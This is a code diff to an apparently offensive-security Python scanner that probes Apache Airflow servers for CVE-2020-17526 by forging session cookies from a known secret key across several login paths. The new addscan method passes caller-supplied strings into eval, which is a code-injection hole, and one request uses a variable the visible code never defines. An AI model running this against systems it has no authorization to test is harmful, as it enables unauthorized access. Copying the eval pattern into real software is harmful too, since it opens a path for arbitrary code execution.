@@ -33,6 +33,18 @@ class Airflow():
                 'path': 'admin/airflow/login',
                 'data': ''
             },
+            {
+                'path': 'airflow/login',
+                'data': ''
+            },
+            {
+                'path': 'login',
+                'data': ''
+            },
+            {
+                'path': '',
+                'data': ''
+            }
         ]
 
     def cve_2020_17526_scan(self, url):
@@ -95,18 +107,18 @@ class Airflow():
 
                         verify_url = url + 'admin/'
                         verify_res = requests.get(
-                        verify_url, 
-                        timeout=self.timeout, 
-                        headers=headers, 
-                        data=data, 
-                        proxies=self.proxies, 
-                        verify=False
-                    )
+                            target, 
+                            timeout=self.timeout, 
+                            headers=headers, 
+                            data=data, 
+                            proxies=self.proxies, 
+                            verify=False
+                        )
                         logger.logging(vul_info, verify_res.status_code, verify_res)          # * LOG
                     else:
-                        return None
+                        continue
                 else:
-                    return None
+                    continue
                 # vul_info['target'] = url + 'admin/'
             except requests.ConnectTimeout:
                 logger.logging(vul_info, 'Timeout')
@@ -126,13 +138,16 @@ class Airflow():
                     'Secret Key': secretKey,
                     'Payload': {
                         'Url': url,
-                        'Path': 'admin/',
+                        'Path': path,
                         'Cookie': cookie['Cookie']
                     }
                 }
                 return results
 
-    def addscan(self, url):
+    def addscan(self, url, vuln=None):
+        if vuln:
+            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))
+
         return [
             thread(target=self.cve_2020_17526_scan, url=url)
         ]
